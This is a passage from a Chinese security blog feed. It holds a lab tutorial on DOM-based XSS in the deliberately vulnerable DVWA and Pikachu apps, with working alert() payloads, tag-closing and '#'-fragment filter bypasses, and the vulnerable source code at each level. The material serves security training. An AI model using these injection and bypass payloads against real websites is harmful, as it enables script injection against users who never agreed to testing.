onclick="alert('xss')">,闭合掉就行</script></code></pre><p>不难发现这个地方存在DOM型XSS。我们输入的东西，经提交过后被window.location.search获取到赋值给变量str，str在将参数传到a标签的herf 属性里面还有url中。这里没有任何安全防范措施。那么，我们就以这为入手点构建闭合的前端代码生成payload。<strong>（ 构建方法在注释里）</strong></p><p><strong>下面是测试payload</strong></p><pre class=" language-JavaScript"><code class="language-JavaScript">需要点击多次点击触发#' onclick="alert(/xss/)"需要点击后鼠标移动到图片上（魔改版）'><img width="10000px" height="10000px"  src="#" onmouseover="alert('xss')" >点击后直接触发xss（魔改版）" '><svg/onload=alert(1)></code></pre><h4 id="思考：这两个DOM-XSS-有什么不同"><a href="#思考：这两个DOM-XSS-有什么不同" class="headerlink" title="思考：这两个DOM_XSS 有什么不同"></a>思考：这两个DOM_XSS 有什么不同</h4><p><strong>我们从利用角度来说吧，</strong>第一个DOM_XSS比较鸡肋，虽然你发现了它，但是没有啥鸟用。没法拿着它去进行有效利用。</p><p>而第二个就不同了，第二个有点类似反射型XSS(GET)，那我们就可以拿它构造特殊payload进行丰富的XSS攻击。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>各位哥哥，真不是我想水，我在前面写的太详细了，该BB的废话我都说完了，所以这篇我就换了思路方式去写，力争各位哥哥在看完这几篇文章后对XSS有更多的认识。接下来我还会写一篇XSS小进阶，下篇我绝对不会水。我先在这立个flag，，，下篇绝对满满干货，绝对满满干货。（希望各位大佬勿喷，我们下篇有缘再见）</p><p><strong>我想说的是</strong>：这篇可能看确实起来过于杂乱无章，摸不着头脑，有些不够详尽。一方面是因为我想前几篇写的很详细，另一方面我想填一下前面几篇的坑。前面几篇力主详细和操作简单化，并未讨论一些深层次的东西。这篇我就想对前面两篇做个扩展，我想更深一层次的带大家去探究XSS利用和提升对XSS认识。</p><p><strong>（注：由于我才能不足，这里的探究也是很初级，至于对XSS认识的提升也是对于小白来说的，希望各位大佬勿怪。）</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> pikachu_XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOM_XSS_简介</title>
      <link href="/2020/01/26/dvwa-dom-xing-xss/"/>
      <url>/2020/01/26/dvwa-dom-xing-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA-DOM-型-XSS"><a href="#DVWA-DOM-型-XSS" class="headerlink" title="DVWA_DOM 型 XSS"></a>DVWA_DOM 型 XSS</h1><h2 id="什么是DOM-XSS"><a href="#什么是DOM-XSS" class="headerlink" title="什么是DOM_XSS"></a>什么是DOM_XSS</h2><h3 id="什么是DOM"><a href="#什么是DOM" class="headerlink" title="什么是DOM"></a>什么是DOM</h3><p><strong>DOM</strong>(Document Object Model)<strong>即文档对象模型， 定义了访问HTML和XML文档的标准。</strong></p><p>DOM 是 W3C（万维网联盟）的标准。DOM 定义了访问 HTML 和 XML 文档的标准：</p><blockquote><p>W3C 文档对象模型 （DOM） 是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p></blockquote><p>W3C DOM 标准被分为 3 个不同的部分：</p><ul><li>核心 DOM - 针对任何结构化文档的标准模型</li><li>XML DOM - 针对 XML 文档的标准模型</li><li>HTML DOM - 针对 HTML 文档的标准模型</li></ul><h4 id="DOM基本功能："><a href="#DOM基本功能：" class="headerlink" title="DOM基本功能："></a><strong>DOM基本功能：</strong></h4><p>① 查询某个元素<br>② 查询某个元素的祖先、兄弟以及后代元素<br>③ 获取、修改元素的属性<br>④ 获取、修改元素的内容<br>⑤ 创建、插入和删除元素</p><h4 id="这里我提几句DOM树吧，稍微了解了解"><a href="#这里我提几句DOM树吧，稍微了解了解" class="headerlink" title="这里我提几句DOM树吧，稍微了解了解"></a>这里我提几句DOM树吧，稍微了解了解</h4><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_19-26-49.png" alt></p><p>HTML DOM 定义了用于 HTML 的一系列标准的对象，以及访问和处理 HTML 文档的标准方法。<br>通过 DOM，可以访问所有的 HTML 元素，连同它们所包含的文本和属性。可以对其中的内容进行修改和删除，同时也可以创建新的元素。HTML DOM 独立于平台和编程语言。它可被任何编程语言诸如 Java、JavaScript 和 VBScript 使用。</p><h4 id="JS-和DOM有什么联系"><a href="#JS-和DOM有什么联系" class="headerlink" title="JS 和DOM有什么联系"></a>JS 和DOM有什么联系</h4><p> <strong>js是代码，html是标记语言</strong></p><p>想要做成动态页面，肯定要用到js了，管你是vue还是ng还是什么的。<br>DOM的妙处在于：它能够在所有浏览器上提供一种一致的方式，通过代码访问HTML的结构和内容。</p><ol><li><p>在浏览器加载一个页面时，浏览器会解析HTML，并创建文档的一个内部模型，其中包含HTML标记的所有元素，自上而下解析，遇到JavaScript浏览器会检查它的正确性，然后执行代码。</p></li><li><p>JavaScript继续执行，使用DOM检查页面、完成修改、从页面接受事件，或者要求浏览器从Web服务器获取其它数据<br>注：document是一个反映HTML的对象，通过调用document的方法改变DOM的状态，也就是改变HTML页面</p></li><li><p>JavaScript修改了DOM时，浏览器会随着动态更新页面。<br>DOM就是一张映射表啦，记录着一堆用代码操控document时的规章制度，直白点说，就是js操作html时的API</p></li></ol><p><strong>关于DOM我就介绍到这里，如果你有兴趣可以看<a href="https://www.jb51.net/article/25107.htm" target="_blank" rel="noopener">这里有个比较快速了解DOM应用的文章</a></strong></p><p><strong>如果你想详细了解那就可以在这里看看的<a href="https://www.w3school.com.cn/htmldom/dom_intro.asp" target="_blank" rel="noopener">详细DOM介绍</a></strong></p><h3 id="关于DOM-XSS攻击"><a href="#关于DOM-XSS攻击" class="headerlink" title="关于DOM_XSS攻击"></a>关于DOM_XSS攻击</h3><p>客户端的脚本程序可以通过DOM动态检查和修改页面内容。它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。如果DOM中的数据没有经过严格确认，就会被注入攻击。</p><p>XSS(DOM)是一种基于DOM树的一种代码注入攻击方式，可以是反射型的，也可以是存储型的，所以它一直被划分第三种XSS</p><p>与前两种XSS相比，它最大的特点就是不与后台服务器交互，只是通过浏览器的DOM树解析产生。</p><h4 id="DOM型哪些类型易产生XSS"><a href="#DOM型哪些类型易产生XSS" class="headerlink" title="DOM型哪些类型易产生XSS"></a>DOM型哪些类型易产生XSS</h4><p>DOM型XSS攻击是DOM的一种攻击。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，例如：</p><ul><li>document.referer</li><li>window. name</li><li>location</li><li>innerHTML</li><li>documen.write</li><li>document.write()</li><li>xxx.outerHTML</li><li>innerHTML.replace</li><li>document.attachEvent()</li><li>window.attachEvent()</li><li>document.location.replace()</li><li>document.location.assign()</li></ul><p><a href="https://www.jianshu.com/p/66870ab5fc10" target="_blank" rel="noopener">更多攻击方式及思路</a></p><h2 id="DVWA-DOM-XSS-讲解"><a href="#DVWA-DOM-XSS-讲解" class="headerlink" title="DVWA_DOM_XSS  讲解"></a>DVWA_DOM_XSS  讲解</h2><h3 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h3><p>现在我们来看low级别的DOM型XSS攻击<br>界面如下</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_20-03-30.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_20-05-02.png" alt></p><p>我们发现我们的选择被传到URL中，那么我们直接在<code>?default=</code>后边直接加上xss攻击的payload会怎样呢？那我们来试试以下吧，payload如下</p><pre class=" language-javascript"><code class="language-javascript">#直接拼接在URL中的<span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span>后面<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>发现弹窗了，成功执行了我们的payload</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_20-12-45.png" alt></p><p><strong>这么简单？？？</strong></p><p><strong>我还没开始我的表演就结束了？？？</strong></p><p><strong>我不服，我不甘心，我要开始我的表演。对，我要开始表演了。啊呜<del>啊呜呜</del></strong></p><p>我们日常F12审查以下源码吧，看看有没有惊喜。</p><p>在源码里发现有DOM用法（<strong>这是废话</strong>，我们打的啥，不就是DVWA_DOM_XSS吗，嘘，别说话，看我表演）</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XSS<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     //从这里看出这是用GET提交表单            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">       <span class="token comment" spellcheck="true">//获取从url中的参数，如果字节大于或者等于零，则赋给变量 lang</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">var</span> lang <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//将获取到的参数变成选项，输出到前端。</span>                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"'>"</span> <span class="token operator">+</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>lang<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='' disabled='disabled'>----&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='English'>English&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='French'>French&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='Spanish'>Spanish&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='German'>German&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>English<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>English<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>disabled<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>----<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>English<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>English<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>French<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>French<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Spanish<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Spanish<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>German<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>German<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Select<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p><strong><code>看我代码注释</code></strong></p><p><strong>我们从选择列表选择的值赋值给default附加到url后，这段js代码将url中default的值赋给option标签的value属性节点和文本节点</strong>，<strong>所以我们拼接在URL中的?default=后面的payload会经过JS处理变成选项输出在前端。</strong>如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_22-40-50.png" alt></p><p>至于为什下面的选项里只有123而没有<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>是因为他被当做JavaScript代码在前端执行了。我们也可以看到在下面的码源里的<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>变成了灰色，说明已经被当做前端JavaScript执行了。</p><p>或者，你这想，这段代码<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>要是和123一起出现在选择框里说明源码option里的代码没有执行，被原封不动的输出到了前端，<strong>你还弹毛线的窗啊。</strong>你说是不是呢？（我不是有意加粗我字体的，你信吗，反正俺信。。。。嘻嘻。。。【狗头保命】）</p><h3 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a><strong>Medium</strong>级</h3><p>有了初级的经验，我就不多说废话了。我们直接测试刚才的payload</p><pre class=" language-JavaScript"><code class="language-JavaScript"><script>alert('hack')</script></code></pre><p>发现不管用了，页面还自动跳转到了<code>English</code>选项。那我们变换大小写试试</p><pre><code>&lt;Script&gt;alert(&#39;hack&#39;)&lt;/scriPt&gt;</code></pre><p>我擦，还不可以用，页面还是自动跳转到了<code>English</code>选项。难道带有script这个关键字就会触发安全防护？</p><p>那我们换一个没有script关键字的还能达到其类似弹窗效果的paylaod试试，代码如下</p><pre class=" language-JavaScript"><code class="language-JavaScript">123<img src=1 onerror=alert(/xss/)>    </code></pre><p>欸，有门头了。这次它没自动跳转到<code>English</code>选项，</p><p>但是，它没弹窗。。。看来还是失败了。我们F12看一下源码看看到底咋回事。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_23-28-52.png" alt></p><p>不看不知道，一看吓一跳。我们的<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>没有了，不见了，也不知道去哪了，没有被显示。那我们那得构造一个payload让它显示出来是不是就能实现我们的攻击。</p><p>怎么构造呢，这是个问题，但这也不是个问题。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> lang <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//我们想办法在这里闭合option,select，那我们就直接传进来"&lt;/option>&lt;/select></span>        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"'>"</span> <span class="token operator">+</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>lang<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当参数传进来时就会变成</span><span class="token comment" spellcheck="true">//&lt;option value='" + lang + "'>""&lt;/option>&lt;/select>&lt;img src=1 onerror=alert(/xss/)> </span><span class="token comment" spellcheck="true">//这样就达到让&lt;/select>&lt;img src=1 onerror=alert(/xss/)> 显示的目的</span>        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='' disabled='disabled'>----&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='English'>English&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='French'>French&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='Spanish'>Spanish&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='German'>German&lt;/option>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><strong><code>看我代码注释</code></strong></p><p>我对下图简单说说吧，绿色水印表示闭合select，黄色水印表示<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>成功显示</p><p><strong>至于原理你看我代码注释吧，应该很容易理解</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_23-51-25.png" alt></p><p>其实这里还有另一种绕过方式，这方式就比较绝了。</p><p><strong>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为</strong></p><pre class=" language-javascript"><code class="language-javascript">直接拼接在URL中的<span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span>后面#<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-08_00-32-33.png" alt></p><p>对了，我还是说一嘴关于script被拦截的问题吧。</p><p>审查源码（<strong>审查Medium级别HTML文件</strong>源码）发现一个PHP脚本，内容如下</p><pre class=" language-PHP"><code class="language-PHP"><?php// Is there any input?if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {    $default = $_GET['default'];    # Do not allow script tags    if (stripos ($default, "<script") !== false) {        header ("location: ?default=English");        exit;    }}?> </code></pre><p>说明如下：</p><ul><li><a href="http://www.runoob.com/php/func-array-key-exists.html" target="_blank" rel="noopener">array_key_exists</a>函数，检查表单get方法提交的参数是否有default</li><li>!is_null ($_GET[ ‘default’ ])，default参数不为空</li><li>以上2点都满足，那么把表单中提交的default参数值赋值给default变量。</li><li>最后利用<a href="http://www.runoob.com/php/func-string-stripos.html" target="_blank" rel="noopener">stripos</a>函数检查default变量，如果包含”&lt;script”字符串，那就把URL的default值改为default=English。</li></ul><p><strong>说白了就是不允许出现script标签，否则就将default的值设为默认的English，（stripos还防止了大小写绕过）</strong></p><h3 id="High级"><a href="#High级" class="headerlink" title="High级"></a><strong>High级</strong></h3><p>有了初级和的经验，我就不多说废话了。我们直接测试刚才的payload</p><pre class=" language-JavaScript"><code class="language-JavaScript"><script>alert('hack')</script></code></pre><p>发现不管用了，页面还自动跳转到了<code>English</code>选项。那我们变换大小写试试</p><pre><code>&lt;Script&gt;alert(&#39;hack&#39;)&lt;/scriPt&gt;</code></pre><p>我擦，还不可以用，页面还是自动跳转到了<code>English</code>选项。难道带有script这个关键字就会触发安全防护？</p><p>那我们换一个没有script关键字的还能达到其类似弹窗效果的paylaod试试，代码如下</p><pre class=" language-JavaScript"><code class="language-JavaScript">123<img src=1 onerror=alert(/xss/)>    </code></pre><p>我日，还不可以用，页面还是自动跳转到了<code>English</code>选项。难道禁止了带有非预期变量输入的安全防护？</p><p>那可咋办，只能输入 <code>&quot;French&quot;  &quot;English&quot; &quot;German&quot; &quot;Spanish&quot;</code>这四个单词有鸟用。</p><p>但是说巧不巧的，我们还有一种不限制拼接的方式绕过。那我们拿来试试吧。</p><p><strong>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为</strong></p><pre class=" language-javascript"><code class="language-javascript">直接拼接在URL中的<span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span>后面#<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>发现可行，这擦简直太棒了</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-08_00-19-44.png" alt></p><p>那我们来审查一下High级别HTML文件源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># Is there any input?</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token shell-comment comment"># White list the allowable languages</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">"French"</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">"English"</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">"German"</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">"Spanish"</span><span class="token punctuation">:</span>            <span class="token shell-comment comment"># ok</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p><strong>在这里，下拉列表框的值设置了白名单，只允许French，English，German，Spanish。如果不是以上这些值，那就是默认值English。这里注入方法只有利用#符号。</strong></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><strong>由于篇幅有限，我在这里就不在过多讲解其他paylaod。那我下面做个简单的小扩展吧。</strong></p><pre class=" language-javascript"><code class="language-javascript">#初级http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">/</span>DVWA<span class="token operator">-</span>master<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span>#<span class="token keyword">default</span><span class="token operator">=</span>English <span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>dvwa<span class="token punctuation">.</span>com<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>dvwa<span class="token punctuation">.</span>com<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span>English<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>#中级http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">/</span>DVWA<span class="token operator">-</span>master<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span>#<span class="token keyword">default</span><span class="token operator">=</span>English <span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>dvwa<span class="token punctuation">.</span>com<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span>English<span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>#高级http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">/</span>DVWA<span class="token operator">-</span>master<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span>#<span class="token keyword">default</span><span class="token operator">=</span>English <span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA_XSS_DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS简介</title>
      <link href="/2020/01/25/xss/"/>
